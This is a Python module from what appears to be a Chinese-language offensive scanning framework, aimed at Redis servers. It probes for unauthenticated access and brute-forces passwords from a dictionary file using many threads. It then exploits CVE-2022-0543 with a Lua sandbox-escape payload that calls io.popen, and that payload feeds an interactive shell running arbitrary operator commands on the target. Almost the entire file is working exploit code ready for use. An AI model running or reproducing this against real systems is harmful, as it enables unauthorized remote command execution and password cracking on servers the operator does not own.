#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import socket
import redis
from pub.com.outprint import OutPrintInfo
from rich.prompt import Prompt
from rich.progress import Progress
from concurrent.futures import ThreadPoolExecutor,wait,as_completed
class Cve_2022_0543:
    def __init__(self):
        self.ip = None
        self.threads = None
        self.port = None
        self.socket = None

    def _4unacc(self,ip, port, timeout):
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send('INFO\r\n'.encode())
        result = s.recv(1024)
        try:
            if "redis_version".encode() in result:
                OutPrintInfo("Redis", f'Target: [b bright_red]{ip}:{port}[/b bright_red]存在redis未授权访问漏洞')
                self.weakpwd(result)
            else:
                OutPrintInfo("Redis", f'Target: {ip}:{port}不存在redis未授权访问漏洞')
        except Exception:
            OutPrintInfo("Redis", f'Target: {ip}:{port}不存在redis未授权访问漏洞')
    def loginPasswd(self,passwd):
        passwd = passwd.strip("\n")
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.ip, int(self.port)))
        self.socket.send("AUTH %s\r\n".encode() % (passwd))
        result = self.socket.recv(1024)
        if 'OK' in result:
            OutPrintInfo("Redis", f'IP:[b bright_red]{self.ip}[/b bright_red]存在弱口令，密码:[b bright_red]{passwd}[/b bright_red]')
            return
        else:
            pass
    def weakpwd(self,result):
        try:
            if "Authentication" in result:
                with open('./dict/redisPasswd.txt','r') as p:
                    passwds = p.readlines()
                    with Progress(transient=True) as progress:
                        tasks = progress.add_task("[b cyan]验证密码...",total=502)
                        with ThreadPoolExecutor(int(self.threads)) as pool:
                            futures = [pool.submit(self.loginPasswd,passwd)for passwd in passwds]
                            for future in as_completed(futures):
                                future.result()
                                progress.update(tasks,advance=1)
                        wait(futures)

            else:pass
            self.socket.close()
        except Exception:
            return

    def Cve_2022_0543(self,ip, port):

        try:
            lua = 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'
            r = redis.Redis(host = ip,port = port)
            script = r.eval(lua,0)
            if script is not None:
                OutPrintInfo("Redis", f'Target: [b bright_red]{ip}:{port}[/b bright_red]存在redis lua脚本执行漏洞')
                exp = Prompt.ask("是否利用漏洞CVE-2022-0543[b bright_red][y/n][/b bright_red]")
                if exp == 'y':
                    self.CVE_2022_0543_exp(ip,port)
                elif exp == 'n':
                    quit()
            else:
                OutPrintInfo("Redis", f'Target: {ip}:{port}不存在redis lua脚本执行漏洞')
        except Exception:
            OutPrintInfo("Redis", f'Target: {ip}:{port}不存在redis lua脚本执行漏洞')

    def CVE_2022_0543_exp(self,ip,port):
        while True:
            cmd = Prompt.ask("输入命令:[b bright_red](q->exit)[/b bright_red]")
            if cmd == "q" or cmd == "exit":
                quit()
            lua= 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
            r  =  redis.Redis(host = ip,port = port)
            script = r.eval(lua,0).decode('utf-8')
            OutPrintInfo("Redis", script)


    def main(self,target):
        self.ip = target["ip"]
        self.port = target["port"]
        self.threads = int(target["threads"])
        if '://' in self.ip:
            OutPrintInfo("Redis", '只支持IP格式')
            return
        else:
            OutPrintInfo("Redis", "开始执行脚本...")
            self._4unacc(self.ip,self.port,timeout=10)
            self.Cve_2022_0543(self.ip,self.port)
            OutPrintInfo("Redis", "脚本执行结束")